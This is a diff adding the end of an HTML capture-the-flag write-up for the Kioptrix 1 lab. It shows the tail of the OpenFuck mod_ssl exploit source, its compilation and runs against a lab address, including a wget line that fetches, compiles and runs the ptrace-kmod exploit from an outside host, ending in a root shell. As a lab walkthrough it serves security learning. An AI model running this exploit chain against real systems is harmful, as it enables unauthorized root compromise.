+                sleep(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                sh(ssl2-&gt;sock);<br>
+                close(ssl2-&gt;sock);<br>
+                close(ssl1-&gt;sock);<br>
+                <span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;<br>
+                }<br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;spabam:&nbsp;It&nbsp;isn't&nbsp;0day&nbsp;*/</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">//&nbsp;milw0rm.com&nbsp;[2003-04-04]</span><br>
+            </div>
+        </div><br>
+        <br>
+        And install some stuff to get ssl to work:<br>
+        <code>apt install libssl1.0-dev</code><br>
+        <br>
+        Now compile it and run it, following the instructions on the exploit page.<br>
+        <a href="https://www.exploit-db.com/exploits/764">https://www.exploit-db.com/exploits/764</a><br>
+        <br>
+            <div class="codebox">
+                root<span style="color:#ff9d00;font-weight:400">@</span>kali<span style="color:#ff9d00;font-weight:400">:~/</span>ctf<span style="color:#ff9d00;font-weight:400">/</span>kioptrix1<span style="color:#ff9d00;font-weight:400">/</span>exploits#&nbsp;gcc&nbsp;<span style="color:#ff0044;font-weight:400">764</span><span style="color:#ff9d00;font-weight:400">-</span>updated<span style="color:#ff9d00;font-weight:400">.</span>c&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>o&nbsp;openfuck&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>lcrypto<br>
+                root<span style="color:#ff9d00;font-weight:400">@</span>kali<span style="color:#ff9d00;font-weight:400">:~/</span>ctf<span style="color:#ff9d00;font-weight:400">/</span>kioptrix1<span style="color:#ff9d00;font-weight:400">/</span>exploits#&nbsp;<span style="color:#ff9d00;font-weight:400">./</span>openfuck&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:400">...</span><br>
+                <span style="color:#ff9d00;font-weight:400">:</span>&nbsp;Usage<span style="color:#ff9d00;font-weight:400">:</span>&nbsp;<span style="color:#ff9d00;font-weight:400">./</span>openfuck&nbsp;target&nbsp;box&nbsp;<span style="color:#ff9d00;font-weight:400">[</span>port<span style="color:#ff9d00;font-weight:400">]</span>&nbsp;<span style="color:#ff9d00;font-weight:400">[-</span>c&nbsp;N<span style="color:#ff9d00;font-weight:400">]</span><br>
+                <br>
+                &nbsp;&nbsp;target&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>&nbsp;supported&nbsp;box&nbsp;eg<span style="color:#ff9d00;font-weight:400">:</span>&nbsp;<span style="color:#ff0044;font-weight:400">0x00</span><br>
+                &nbsp;&nbsp;box&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>&nbsp;hostname&nbsp;or&nbsp;IP&nbsp;address<br>
+                &nbsp;&nbsp;port&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>&nbsp;port&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;ssl&nbsp;connection<br>
+                &nbsp;&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>c&nbsp;open&nbsp;N&nbsp;connections<span style="color:#ff9d00;font-weight:400">.</span>&nbsp;<span style="color:#ff9d00;font-weight:400">(</span>use&nbsp;range&nbsp;<span style="color:#ff0044;font-weight:400">40</span><span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">50</span>&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;u&nbsp;dont&nbsp;know<span style="color:#ff9d00;font-weight:400">)</span><br>
+                <span style="color:#ff9d00;font-weight:400">...</span><br>
+                root<span style="color:#ff9d00;font-weight:400">@</span>kali<span style="color:#ff9d00;font-weight:400">:~/</span>ctf<span style="color:#ff9d00;font-weight:400">/</span>kioptrix1<span style="color:#ff9d00;font-weight:400">/</span>exploits#&nbsp;<span style="color:#ff9d00;font-weight:400">./</span>openfuck&nbsp;<span style="color:#ff9d00;font-weight:400">|</span>&nbsp;grep&nbsp;<span style="color:#ff0044;font-weight:400">1.3.20</span><br>
+                <span style="color:#ff0044;font-weight:400">0x02</span>&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>&nbsp;Cobalt&nbsp;Sun&nbsp;<span style="color:#ff0044;font-weight:400">6.0</span>&nbsp;<span style="color:#ff9d00;font-weight:400">(</span>apache<span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">1.3.20</span><span style="color:#ff9d00;font-weight:400">)</span><br>
+                <span style="color:#ff0044;font-weight:400">0x27</span>&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>&nbsp;FreeBSD&nbsp;<span style="color:#ff9d00;font-weight:400">(</span>apache<span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">1.3.20</span><span style="color:#ff9d00;font-weight:400">)</span><br>
+                <span style="color:#ff0044;font-weight:400">0x28</span>&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>&nbsp;FreeBSD&nbsp;<span style="color:#ff9d00;font-weight:400">(</span>apache<span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">1.3.20</span><span style="color:#ff9d00;font-weight:400">)</span><br>
+                <span style="color:#ff0044;font-weight:400">0x29</span>&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>&nbsp;FreeBSD&nbsp;<span style="color:#ff9d00;font-weight:400">(</span>apache<span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">1.3.20</span><span style="color:#ff9d00;font-weight:400">+</span><span style="color:#ff0044;font-weight:400">2.8.4</span><span style="color:#ff9d00;font-weight:400">)</span><br>
+                <span style="color:#ff0044;font-weight:400">0x2a</span>&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>&nbsp;FreeBSD&nbsp;<span style="color:#ff9d00;font-weight:400">(</span>apache<span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">1.3.20</span><span style="color:#ff9d00;font-weight:400">_</span>1<span style="color:#ff9d00;font-weight:400">)</span><br>
+                <span style="color:#ff0044;font-weight:400">0x3a</span>&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>&nbsp;Mandrake&nbsp;Linux&nbsp;<span style="color:#ff0044;font-weight:400">7.2</span>&nbsp;<span style="color:#ff9d00;font-weight:400">(</span>apache<span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">1.3.20</span><span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">5.1</span>mdk<span style="color:#ff9d00;font-weight:400">)</span><br>
+                <span style="color:#ff0044;font-weight:400">0x3b</span>&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>&nbsp;Mandrake&nbsp;Linux&nbsp;<span style="color:#ff0044;font-weight:400">7.2</span>&nbsp;<span style="color:#ff9d00;font-weight:400">(</span>apache<span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">1.3.20</span><span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">5.2</span>mdk<span style="color:#ff9d00;font-weight:400">)</span><br>
+                <span style="color:#ff0044;font-weight:400">0x3f</span>&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>&nbsp;Mandrake&nbsp;Linux&nbsp;<span style="color:#ff0044;font-weight:400">8.1</span>&nbsp;<span style="color:#ff9d00;font-weight:400">(</span>apache<span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">1.3.20</span><span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">3</span><span style="color:#ff9d00;font-weight:400">)</span><br>
+                <span style="color:#ff0044;font-weight:400">0x6a</span>&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>&nbsp;RedHat&nbsp;Linux&nbsp;<span style="color:#ff0044;font-weight:400">7.2</span>&nbsp;<span style="color:#ff9d00;font-weight:400">(</span>apache<span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">1.3.20</span><span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">16</span><span style="color:#ff9d00;font-weight:400">)</span><span style="color:#ff0044;font-weight:400">1</span><br>
+                <span style="color:#ff0044;font-weight:400">0x6b</span>&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>&nbsp;RedHat&nbsp;Linux&nbsp;<span style="color:#ff0044;font-weight:400">7.2</span>&nbsp;<span style="color:#ff9d00;font-weight:400">(</span>apache<span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">1.3.20</span><span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">16</span><span style="color:#ff9d00;font-weight:400">)</span><span style="color:#ff0044;font-weight:400">2</span><br>
+                <span style="color:#ff0044;font-weight:400">0x7e</span>&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>&nbsp;Slackware&nbsp;Linux&nbsp;<span style="color:#ff0044;font-weight:400">8.0</span>&nbsp;<span style="color:#ff9d00;font-weight:400">(</span>apache<span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">1.3.20</span><span style="color:#ff9d00;font-weight:400">)</span><br>
+                <span style="color:#ff0044;font-weight:400">0x86</span>&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>&nbsp;SuSE&nbsp;Linux&nbsp;<span style="color:#ff0044;font-weight:400">7.3</span>&nbsp;<span style="color:#ff9d00;font-weight:400">(</span>apache<span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">1.3.20</span><span style="color:#ff9d00;font-weight:400">)</span><br>
+                root<span style="color:#ff9d00;font-weight:400">@</span>kali<span style="color:#ff9d00;font-weight:400">:~/</span>ctf<span style="color:#ff9d00;font-weight:400">/</span>kioptrix1<span style="color:#ff9d00;font-weight:400">/</span>exploits#&nbsp;<span style="color:#ff9d00;font-weight:400">./</span>openfuck&nbsp;<span style="color:#ff0044;font-weight:400">0x6a</span>&nbsp;<span style="color:#ff0044;font-weight:400">192.168.1.104</span>&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>c&nbsp;<span style="color:#ff0044;font-weight:400">50</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:400">*******************************************************************</span><br>
+                <span style="color:#ff9d00;font-weight:400">*</span>&nbsp;OpenFuck&nbsp;v3<span style="color:#ff0044;font-weight:400">.0.32</span><span style="color:#ff9d00;font-weight:400">-</span>root&nbsp;priv8&nbsp;by&nbsp;SPABAM&nbsp;based&nbsp;on&nbsp;openssl<span style="color:#ff9d00;font-weight:400">-</span>too<span style="color:#ff9d00;font-weight:400">-</span>open&nbsp;<span style="color:#ff9d00;font-weight:400">*</span><br>
+                <span style="color:#ff9d00;font-weight:400">*******************************************************************</span><br>
+                <span style="color:#ff9d00;font-weight:400">*</span>&nbsp;by&nbsp;SPABAM&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">with</span>&nbsp;code&nbsp;of&nbsp;Spabam&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>&nbsp;LSD<span style="color:#ff9d00;font-weight:400">-</span>pl&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>&nbsp;SolarEclipse&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>&nbsp;CORE&nbsp;<span style="color:#ff9d00;font-weight:400">*</span><br>
+                <span style="color:#ff9d00;font-weight:400">*</span>&nbsp;#hackarena&nbsp;&nbsp;irc<span style="color:#ff9d00;font-weight:400">.</span>brasnet<span style="color:#ff9d00;font-weight:400">.</span>org&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:400">*</span><br>
+                <span style="color:#ff9d00;font-weight:400">*</span>&nbsp;TNX&nbsp;Xanthic&nbsp;USG&nbsp;#SilverLords&nbsp;#BloodBR&nbsp;#isotk&nbsp;#highsecure&nbsp;#uname&nbsp;<span style="color:#ff9d00;font-weight:400">*</span><br>
+                <span style="color:#ff9d00;font-weight:400">*</span>&nbsp;#ION&nbsp;#delirium&nbsp;#nitr0x&nbsp;#coder&nbsp;#root&nbsp;#endiabrad0s&nbsp;#NHC&nbsp;#TechTeam&nbsp;<span style="color:#ff9d00;font-weight:400">*</span><br>
+                <span style="color:#ff9d00;font-weight:400">*</span>&nbsp;#pinchadoresweb&nbsp;HiTechHate&nbsp;DigitalWrapperz&nbsp;P<span style="color:#ff9d00;font-weight:400">()</span>W&nbsp;GAT&nbsp;ButtP<span style="color:#ff9d00;font-weight:400">!</span>rateZ&nbsp;<span style="color:#ff9d00;font-weight:400">*</span><br>
+                <span style="color:#ff9d00;font-weight:400">*******************************************************************</span><br>
+                <br>
+                Connection<span style="color:#ff9d00;font-weight:400">...</span>&nbsp;<span style="color:#ff0044;font-weight:400">50</span>&nbsp;of&nbsp;<span style="color:#ff0044;font-weight:400">50</span><br>
+                Establishing&nbsp;SSL&nbsp;connection<br>
+                cipher<span style="color:#ff9d00;font-weight:400">:</span>&nbsp;<span style="color:#ff0044;font-weight:400">0x4043808c</span>&nbsp;&nbsp;&nbsp;ciphers<span style="color:#ff9d00;font-weight:400">:</span>&nbsp;<span style="color:#ff0044;font-weight:400">0x80f8050</span><br>
+                Ready&nbsp;to&nbsp;send&nbsp;shellcode<br>
+                Spawning&nbsp;shell<span style="color:#ff9d00;font-weight:400">...</span><br>
+                Good&nbsp;Bye<span style="color:#ff9d00;font-weight:400">!</span><br>
+                root<span style="color:#ff9d00;font-weight:400">@</span>kali<span style="color:#ff9d00;font-weight:400">:~/</span>ctf<span style="color:#ff9d00;font-weight:400">/</span>kioptrix1<span style="color:#ff9d00;font-weight:400">/</span>exploits#&nbsp;<span style="color:#ff9d00;font-weight:400">./</span>openfuck&nbsp;<span style="color:#ff0044;font-weight:400">0x6b</span>&nbsp;<span style="color:#ff0044;font-weight:400">192.168.1.104</span>&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>c&nbsp;<span style="color:#ff0044;font-weight:400">50</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:400">*******************************************************************</span><br>
+                <span style="color:#ff9d00;font-weight:400">*</span>&nbsp;OpenFuck&nbsp;v3<span style="color:#ff0044;font-weight:400">.0.32</span><span style="color:#ff9d00;font-weight:400">-</span>root&nbsp;priv8&nbsp;by&nbsp;SPABAM&nbsp;based&nbsp;on&nbsp;openssl<span style="color:#ff9d00;font-weight:400">-</span>too<span style="color:#ff9d00;font-weight:400">-</span>open&nbsp;<span style="color:#ff9d00;font-weight:400">*</span><br>
+                <span style="color:#ff9d00;font-weight:400">*******************************************************************</span><br>
+                <span style="color:#ff9d00;font-weight:400">*</span>&nbsp;by&nbsp;SPABAM&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">with</span>&nbsp;code&nbsp;of&nbsp;Spabam&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>&nbsp;LSD<span style="color:#ff9d00;font-weight:400">-</span>pl&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>&nbsp;SolarEclipse&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>&nbsp;CORE&nbsp;<span style="color:#ff9d00;font-weight:400">*</span><br>
+                <span style="color:#ff9d00;font-weight:400">*</span>&nbsp;#hackarena&nbsp;&nbsp;irc<span style="color:#ff9d00;font-weight:400">.</span>brasnet<span style="color:#ff9d00;font-weight:400">.</span>org&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:400">*</span><br>
+                <span style="color:#ff9d00;font-weight:400">*</span>&nbsp;TNX&nbsp;Xanthic&nbsp;USG&nbsp;#SilverLords&nbsp;#BloodBR&nbsp;#isotk&nbsp;#highsecure&nbsp;#uname&nbsp;<span style="color:#ff9d00;font-weight:400">*</span><br>
+                <span style="color:#ff9d00;font-weight:400">*</span>&nbsp;#ION&nbsp;#delirium&nbsp;#nitr0x&nbsp;#coder&nbsp;#root&nbsp;#endiabrad0s&nbsp;#NHC&nbsp;#TechTeam&nbsp;<span style="color:#ff9d00;font-weight:400">*</span><br>
+                <span style="color:#ff9d00;font-weight:400">*</span>&nbsp;#pinchadoresweb&nbsp;HiTechHate&nbsp;DigitalWrapperz&nbsp;P<span style="color:#ff9d00;font-weight:400">()</span>W&nbsp;GAT&nbsp;ButtP<span style="color:#ff9d00;font-weight:400">!</span>rateZ&nbsp;<span style="color:#ff9d00;font-weight:400">*</span><br>
+                <span style="color:#ff9d00;font-weight:400">*******************************************************************</span><br>
+                <br>
+                Connection<span style="color:#ff9d00;font-weight:400">...</span>&nbsp;<span style="color:#ff0044;font-weight:400">50</span>&nbsp;of&nbsp;<span style="color:#ff0044;font-weight:400">50</span><br>
+                Establishing&nbsp;SSL&nbsp;connection<br>
+                cipher<span style="color:#ff9d00;font-weight:400">:</span>&nbsp;<span style="color:#ff0044;font-weight:400">0x4043808c</span>&nbsp;&nbsp;&nbsp;ciphers<span style="color:#ff9d00;font-weight:400">:</span>&nbsp;<span style="color:#ff0044;font-weight:400">0x80f81c8</span><br>
+                Ready&nbsp;to&nbsp;send&nbsp;shellcode<br>
+                Spawning&nbsp;shell<span style="color:#ff9d00;font-weight:400">...</span><br>
+                bash<span style="color:#ff9d00;font-weight:400">:</span>&nbsp;no&nbsp;job&nbsp;control&nbsp;in&nbsp;<span style="color:#ff9d00;font-weight:700">this</span>&nbsp;shell<br>
+                bash<span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">2.05</span>$&nbsp;<br>
+                bash<span style="color:#ff9d00;font-weight:400">-</span><span style="color:#ff0044;font-weight:400">2.05</span>$&nbsp;unset&nbsp;HISTFILE<span style="color:#ff9d00;font-weight:400">;</span>&nbsp;cd&nbsp;<span style="color:#ff9d00;font-weight:400">/</span>tmp<span style="color:#ff9d00;font-weight:400">;</span>&nbsp;wget&nbsp;https<span style="color:#ff9d00;font-weight:400">://</span>dl<span style="color:#ff9d00;font-weight:400">.</span>packetstormsecurity<span style="color:#ff9d00;font-weight:400">.</span>net<span style="color:#ff9d00;font-weight:400">/</span><span style="color:#ff0044;font-weight:400">0304</span><span style="color:#ff9d00;font-weight:400">-</span>exploits<span style="color:#ff9d00;font-weight:400">/</span>ptrace<span style="color:#ff9d00;font-weight:400">-</span>kmod<span style="color:#ff9d00;font-weight:400">.</span>c<span style="color:#ff9d00;font-weight:400">;</span>&nbsp;gcc&nbsp;<span style="color:#ff9d00;font-weight:400">-</span>o&nbsp;p&nbsp;ptrace<span style="color:#ff9d00;font-weight:400">-</span>kmod<span style="color:#ff9d00;font-weight:400">.</span>c<span style="color:#ff9d00;font-weight:400">;</span>&nbsp;rm&nbsp;ptrace<span style="color:#ff9d00;font-weight:400">-</span>kmod<span style="color:#ff9d00;font-weight:400">.</span>c<span style="color:#ff9d00;font-weight:400">;</span>&nbsp;<span style="color:#ff9d00;font-weight:400">./</span>p<span style="color:#ff9d00;font-weight:400">;</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:400">--</span><span style="color:#ff0044;font-weight:400">15</span><span style="color:#ff9d00;font-weight:400">:</span><span style="color:#ff0044;font-weight:400">59</span><span style="color:#ff9d00;font-weight:400">:</span><span style="color:#ff0044;font-weight:400">58</span><span style="color:#ff9d00;font-weight:400">--</span>&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:400">://</span>dl<span style="color:#ff9d00;font-weight:400">.</span>packetstormsecurity<span style="color:#ff9d00;font-weight:400">.</span>net<span style="color:#ff9d00;font-weight:400">/</span><span style="color:#ff0044;font-weight:400">0304</span><span style="color:#ff9d00;font-weight:400">-</span>exploits<span style="color:#ff9d00;font-weight:400">/</span>ptrace<span style="color:#ff9d00;font-weight:400">-</span>kmod<span style="color:#ff9d00;font-weight:400">.</span>c<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:400">=&gt;</span>&nbsp;`ptrace-kmod.c'<br>
+                Connecting&nbsp;to&nbsp;dl.packetstormsecurity.net:443...&nbsp;connected!<br>
+                HTTP&nbsp;request&nbsp;sent,&nbsp;awaiting&nbsp;response...&nbsp;200&nbsp;OK<br>
+                Length:&nbsp;3,921&nbsp;[text/x-csrc]<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;0K&nbsp;...&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;@&nbsp;&nbsp;&nbsp;3.74&nbsp;MB/s<br>
+                <br>
+                15:59:59&nbsp;(3.74&nbsp;MB/s)&nbsp;-&nbsp;`ptrace<span style="color:#ff9d00;font-weight:400">-</span>kmod<span style="color:#ff9d00;font-weight:400">.</span>c'&nbsp;saved&nbsp;<span style="color:#ff9d00;font-weight:400">[</span><span style="color:#ff0044;font-weight:400">3921</span><span style="color:#ff9d00;font-weight:400">/</span><span style="color:#ff0044;font-weight:400">3921</span><span style="color:#ff9d00;font-weight:400">]</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:400">/</span>usr<span style="color:#ff9d00;font-weight:400">/</span>bin<span style="color:#ff9d00;font-weight:400">/</span>ld<span style="color:#ff9d00;font-weight:400">:</span>&nbsp;cannot&nbsp;open&nbsp;output&nbsp;file&nbsp;p<span style="color:#ff9d00;font-weight:400">:</span>&nbsp;Permission&nbsp;denied<br>
+                collect2<span style="color:#ff9d00;font-weight:400">:</span>&nbsp;ld&nbsp;returned&nbsp;<span style="color:#ff0044;font-weight:400">1</span>&nbsp;exit&nbsp;status<br>
+                id<br>
+                uid<span style="color:#ff9d00;font-weight:400">=</span><span style="color:#ff0044;font-weight:400">0</span><span style="color:#ff9d00;font-weight:400">(</span>root<span style="color:#ff9d00;font-weight:400">)</span>&nbsp;gid<span style="color:#ff9d00;font-weight:400">=</span><span style="color:#ff0044;font-weight:400">0</span><span style="color:#ff9d00;font-weight:400">(</span>root<span style="color:#ff9d00;font-weight:400">)</span>&nbsp;groups<span style="color:#ff9d00;font-weight:400">=</span><span style="color:#ff0044;font-weight:400">0</span><span style="color:#ff9d00;font-weight:400">(</span>root<span style="color:#ff9d00;font-weight:400">),</span><span style="color:#ff0044;font-weight:400">1</span><span style="color:#ff9d00;font-weight:400">(</span>bin<span style="color:#ff9d00;font-weight:400">),</span><span style="color:#ff0044;font-weight:400">2</span><span style="color:#ff9d00;font-weight:400">(</span>daemon<span style="color:#ff9d00;font-weight:400">),</span><span style="color:#ff0044;font-weight:400">3</span><span style="color:#ff9d00;font-weight:400">(</span>sys<span style="color:#ff9d00;font-weight:400">),</span><span style="color:#ff0044;font-weight:400">4</span><span style="color:#ff9d00;font-weight:400">(</span>adm<span style="color:#ff9d00;font-weight:400">),</span><span style="color:#ff0044;font-weight:400">6</span><span style="color:#ff9d00;font-weight:400">(</span>disk<span style="color:#ff9d00;font-weight:400">),</span><span style="color:#ff0044;font-weight:400">10</span><span style="color:#ff9d00;font-weight:400">(</span>wheel<span style="color:#ff9d00;font-weight:400">)</span>
+            </div>
+        </div><br>
+        <br>
+        There's no hit on 0x6a, but on 0x6b you get a root shell!<br>
+    </writeup>
+</section>
+
+</body>
+</html>
